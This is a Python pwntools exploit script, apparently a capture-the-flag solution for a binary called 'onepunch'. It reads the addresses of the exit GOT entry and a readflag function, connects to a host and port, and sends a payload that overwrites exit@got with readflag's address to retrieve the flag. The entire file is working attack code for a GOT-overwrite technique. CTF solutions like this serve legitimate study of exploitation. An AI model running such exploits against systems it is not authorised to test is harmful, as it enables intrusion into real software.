#!/usr/bin/env python3

from pwn import *
import sys
import os

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port> [binary_path]")
        print("  binary_path is optional - if provided, addresses will be extracted from it")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    binary_path = sys.argv[3] if len(sys.argv) > 3 else None
    
    # Try to extract addresses from binary if provided
    exit_got = None
    readflag_addr = None
    
    if binary_path and os.path.exists(binary_path):
        try:
            elf = ELF(binary_path)
            exit_got = elf.got['exit']
            readflag_addr = elf.symbols['readflag']
            print(f"[*] Loaded binary: {binary_path}")
            print(f"[*] exit@got.plt: {hex(exit_got)}")
            print(f"[*] readflag(): {hex(readflag_addr)}")
        except Exception as e:
            print(f"[-] Error loading binary: {e}")
            print("[-] You can extract addresses manually:")
            print("    objdump -R onepunch | grep exit")
            print("    objdump -t onepunch | grep readflag")
            sys.exit(1)
    else:
        # Try common locations
        possible_paths = [
            './onepunch',
            './src/onepunch',
            '../src/onepunch',
            'onepunch-bundle.tgz'
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                try:
                    if path.endswith('.tgz'):
                        # Would need to extract first
                        continue
                    elf = ELF(path)
                    exit_got = elf.got['exit']
                    readflag_addr = elf.symbols['readflag']
                    print(f"[*] Found binary: {path}")
                    print(f"[*] exit@got.plt: {hex(exit_got)}")
                    print(f"[*] readflag(): {hex(readflag_addr)}")
                    break
                except:
                    continue
    
    if exit_got is None or readflag_addr is None:
        print("[-] Could not find addresses. Please provide binary path or extract manually:")
        print("    objdump -R onepunch | grep exit")
        print("    objdump -t onepunch | grep readflag")
        print("    Then modify this script to use the addresses directly.")
        sys.exit(1)
    
    # Connect to the service
    print(f"[*] Connecting to {host}:{port}")
    conn = remote(host, port)
    
    # Build payload: 8 bytes address + 8 bytes value
    payload = p64(exit_got) + p64(readflag_addr)
    
    print(f"[*] Sending payload...")
    conn.send(payload)
    
    # Receive the flag
    print(f"[*] Receiving flag...")
    try:
        flag = conn.recvall(timeout=2)
        print(flag.decode('utf-8', errors='ignore'))
    except:
        print("[-] No response received")
    
    conn.close()

if __name__ == '__main__':
    main()
